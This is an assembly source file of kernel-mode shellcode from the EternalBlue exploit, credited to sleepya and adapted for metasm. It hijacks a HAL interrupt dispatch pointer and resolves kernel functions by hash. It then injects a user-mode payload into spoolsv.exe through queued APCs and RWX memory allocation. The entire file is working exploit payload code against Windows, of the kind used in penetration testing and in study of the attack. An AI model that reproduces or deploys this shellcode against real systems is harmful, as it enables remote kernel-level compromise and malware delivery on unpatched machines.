; kernel_shellcode.asm
; Function and offset resolution shellcode by sleepya (EternalBlue exploit)
;
; The payload is "installed" by being transferred into RWX memory and then overwriting the hal!HalpApicRequestInterrupt
; pointer in the hal!HalpApicRequestInterrupt dispatch table, effectively hooking it. Once executed, the shellcode will
; restore the original function pointer.
;
; This was updated to be compatible with metasm. The following 3 values need to be specified via #fixup:
;   * PHALP_APIC_REQUEST_INTERRUPT - the original address of hal!HalpApicRequestInterrupt
;   * PPHALP_APIC_REQUEST_INTERRUPT - the address of the pointer to hal!HalpApicRequestInterrupt in
;     hal!HalpInterruptController
;   * USER_SHELLCODE_SIZE - the length in bytes of the usermode shellcode
;
; The layout in memory will be as follows (only the first two sections need to be passed with the exploit):
; [ kernel mode shellcode ] [ user mode shellcode ] [ kernel mode shellcode data ]

; offsets to members within the shellcode's data section
#define OFFSET_NTBASE         0x0
#define OFFSET_PEB_ADDR       0x8
#define OFFSET_KAPC           0x10
#define OFFSET_KAPC2          0x68
#define OFFSET_SC_BASE_ADDR   0xD0

; some hardcoded EPROCESS and ETHREAD field offsets. I think they're consistent on Win10?
#define OFFSET_EPROCTHREADLIST   0x30
#define OFFSET_ETHREADTHREADLIST 0x2F8
#define OFFSET_ETHREADMISCFLAGS  0x74
#define OFFSET_MISCFLALTERTABLE  0x4

; peb offsets
#define OFFSET_PEB_LDR        0x18
#define OFFSET_PEB_INMEMORDER 0x20

; hashes to resolve function pointers
#define HASH_PSGETCURRPROC      0xDBF47C78
#define HASH_PSGETPROCIMAGENAME 0x77645F3F
#define HASH_PSGETPROCID        0x170114E1
#define HASH_PSGETPROCPEB       0xB818B848
#define HASH_KEINITIALIZEAPC    0x6D195CC4
#define HASH_KEINSERTQUEUEAPC   0xAFCC4634
#define HASH_ZWALLOCVIRTMEM     0x576E99EA
#define HASH_CREATETHREAD       0x835E515E
#define HASH_SPOOLSV            0x3EE083D8

; size of usermode APC shellcode

_main:

_prologue:
  push r8
  push r9
  push r13
  push r15
  push r14
  push rcx
  push rdx
  push rbx
  push rsi
  push rdi
  lea r14, [rip-$_+_data_addr]
  add r14, USER_SHELLCODE_SIZE

_patch_back_hal_table:
  mov rax, PPHALP_APIC_REQUEST_INTERRUPT
  mov rbx, PHALP_APIC_REQUEST_INTERRUPT
  mov [rax], rbx
  sti

  xor rcx, rcx
  db 0x44, 0x0f, 0x22, 0xc1  ; 'mov cr8, rcx' (metasm incorrectly encodes this instruction)
  mov ecx, 0xc0000082
  rdmsr
  and eax, 0xFFFFF000
  shl rdx, 0x20
  add rax, rdx

_find_nt_base:
  sub rax, 0x1000
  cmp word [rax], 0x5a4d
  jne _find_nt_base

  mov r15, rax
  mov [r14 + OFFSET_NTBASE], r15

_get_current_eprocess:
  mov edi, HASH_PSGETCURRPROC
  call _call_nt_func
  mov r13, rax

_get_image_name_eprocess:
  mov edi, HASH_PSGETPROCIMAGENAME
  call _get_offset_from_function
  mov rcx, rax

_get_proc_links_eprocess:
  mov edi, HASH_PSGETPROCID
  call _get_offset_from_function
  mov rdx, rax
  add rdx, 0x8

_find_target_process_loop:
  lea rsi, [r13+rcx]
  call calc_hash
  cmp eax, HASH_SPOOLSV
  je _found_target_process
  mov r13, [r13+rdx]
  sub r13, rdx
  jmp _find_target_process_loop

_found_target_process:
  mov edi, HASH_PSGETPROCPEB
  mov rcx, r13
  call _call_nt_func
  mov [r14 + OFFSET_PEB_ADDR], rax

  mov r8, [r13 + OFFSET_EPROCTHREADLIST]
  mov r9, [r13 + OFFSET_EPROCTHREADLIST + 0x8]
  sub r8, OFFSET_ETHREADTHREADLIST
  xor rsi, rsi

_find_good_thread:
  sub r9, OFFSET_ETHREADTHREADLIST
  mov edi, dword [r9 + OFFSET_ETHREADMISCFLAGS]
  bt edi, OFFSET_MISCFLALTERTABLE
  jnc _find_good_thread_loop
  mov rsi, r9
  jmp _init_apc

_find_good_thread_loop:
  cmp r8, r9
  mov r9, [r9 + OFFSET_ETHREADTHREADLIST + 8]
  jne _find_good_thread

_init_apc:
  test rsi, rsi
  jz _restore_regs_and_jmp_back
  lea rcx, [r14 + OFFSET_KAPC]
  mov rdx, rsi
  xor r8, r8
  lea r9, [rip-$_+_kernel_apc_routine]
  push rdx
  push r8
  push r8
  push r8
  mov edi, HASH_KEINITIALIZEAPC
  sub rsp, 0x20
  call _call_nt_func
  add rsp, 0x40

_insert_apc:
  lea rcx, [r14 + OFFSET_KAPC]
  mov edi, HASH_KEINSERTQUEUEAPC
  sub rsp, 0x20
  mov rax, 0x5
  db 0x44, 0x0f, 0x22, 0xc0      ; 'mov cr8, rax' (metasm incorrectly encodes this instruction)
  call _call_nt_func
  add rsp, 0x20

_restore_regs_and_jmp_back:
  cli
  mov rax, rbx
  pop rdi
  pop rsi
  pop rbx
  pop rdx
  pop rcx
  pop r14
  pop r15
  pop r13
  pop r9
  pop r8
  jmp rax

_call_nt_func:
  call _get_proc_addr
  jmp rax

_get_proc_addr:
  ; Save registers
  push rbx
  push rcx
  push rsi                 ; for using calc_hash

  ; use rax to find EAT
  mov eax, dword [r15+60]  ; Get PE header e_lfanew
  add rax, r15
  mov eax, dword [rax+136] ; Get export tables RVA

  add rax, r15
  push rax                 ; save EAT

  mov ecx, dword [rax+24]  ; NumberOfFunctions
  mov ebx, dword [rax+32]  ; FunctionNames
  add rbx, r15

_get_proc_addr_get_next_func:
  ; When we reach the start of the EAT (we search backwards), we hang or crash
  dec ecx                     ; decrement NumberOfFunctions
  mov esi, dword [rbx+rcx*4]  ; Get rva of next module name
  add rsi, r15                ; Add the modules base address

  call calc_hash

  cmp eax, edi                        ; Compare the hashes
  jnz _get_proc_addr_get_next_func    ; try the next function

_get_proc_addr_finish:
  pop rax                     ; restore EAT
  mov ebx, dword [rax+36]
  add rbx, r15                ; ordinate table virtual address
  mov cx, word [rbx+rcx*2]    ; desired functions ordinal
  mov ebx, dword [rax+28]     ; Get the function addresses table rva
  add rbx, r15                ; Add the modules base address
  mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA
  add rax, r15                ; Add the modules base address to get the functions actual VA

  pop rsi
  pop rcx
  pop rbx
  ret

calc_hash:
  push rdx
  xor eax, eax
  cdq
_calc_hash_loop:
  lodsb                   ; Read in the next byte of the ASCII string
  ror edx, 13             ; Rotate right our hash value
  add edx, eax            ; Add the next byte of the string
  test eax, eax           ; Stop when found NULL
  jne _calc_hash_loop
  xchg edx, eax
  pop rdx
  ret

_get_offset_from_function:
  call _get_proc_addr
  cmp byte [rax+2], 0x80
  ja _get_offset_dword
  movzx eax, byte [rax+3]
  ret
_get_offset_dword:
  mov eax, dword [rax+3]
  ret

_kernel_apc_routine:
  push r15
  push r14
  push rdi
  push rsi

_find_createthread_addr:
  lea rax, [rip-$_+_data_addr]
  mov rax, [rax + USER_SHELLCODE_SIZE + OFFSET_PEB_ADDR]
  mov rcx, [rax + OFFSET_PEB_LDR]
  mov rcx, [rcx + OFFSET_PEB_INMEMORDER]

_find_kernel32_dll_loop:
  mov rcx, [rcx]
  cmp word [rcx+0x48], 0x18
  jne _find_kernel32_dll_loop

  mov rax, [rcx+0x50]
  cmp dword [rax+0xc], 0x00320033
  jnz _find_kernel32_dll_loop

  mov r15, [rcx + 0x20]
  mov edi, HASH_CREATETHREAD
  call _get_proc_addr
  mov r14, rax

_alloc_mem:
  lea r15, [rip-$_+_data_addr]
  mov r15, [r15 + USER_SHELLCODE_SIZE + OFFSET_NTBASE]
  xor eax, eax
  lea rdx, [rip-$_+_data_addr]
  add rdx, USER_SHELLCODE_SIZE + OFFSET_SC_BASE_ADDR
  mov ecx, eax
  not rcx
  mov r8, rax
  mov al, 0x40
  push rax
  shl eax, 6
  push rax
  mov [r9], rax
  sub rsp, 0x20
  mov edi, HASH_ZWALLOCVIRTMEM
  call _call_nt_func
  add rsp, 0x30

_copy_user_bootstrap_and_shellcode:
  lea rdi, [rip-$_+_data_addr]
  mov rdi, [rdi + USER_SHELLCODE_SIZE + OFFSET_SC_BASE_ADDR]
  lea rsi, [rip-$_+_user_shellcode_bootstrap]
  mov ecx, 0x1d + USER_SHELLCODE_SIZE
  rep movsb

_init_and_insert_apc:
  lea rcx, [rip-$_+_data_addr]
  add rcx, USER_SHELLCODE_SIZE + OFFSET_KAPC2
  mov rdx, qword [gs:0x188]
  xor r8, r8
  lea r9, [rip-$_+_kernel_apc_routine2]
  push r8
  push 0x1
  lea rax, [rip-$_+_data_addr]
  mov rax, [rax + USER_SHELLCODE_SIZE + OFFSET_SC_BASE_ADDR]
  push rax
  push r8
  sub rsp, 0x20
  mov edi, HASH_KEINITIALIZEAPC
  call _call_nt_func
  add rsp, 0x40

  lea rcx, [rip-$_+_data_addr]
  add rcx, USER_SHELLCODE_SIZE + OFFSET_KAPC2
  mov rdx, r14
  xor r9, r9
  mov edi, HASH_KEINSERTQUEUEAPC
  sub rsp, 0x20
  call _call_nt_func
  add rsp, 0x20

_kernel_apc_done:
  pop rsi
  pop rdi
  pop r14
  pop r15
  ret

_kernel_apc_routine2:
  nop
  ret

_user_shellcode_bootstrap:
  xchg rdx, rax
  xor ecx, ecx
  push rcx
  push rcx
  mov r9, rcx
  lea r8, [rip-$_+_user_shellcode] ; user payload has been appended to bottom of this shellcode
  mov edx, ecx
  sub rsp, 0x20
  call rax
  add rsp, 0x30
  ret

_data_addr:

_user_shellcode:
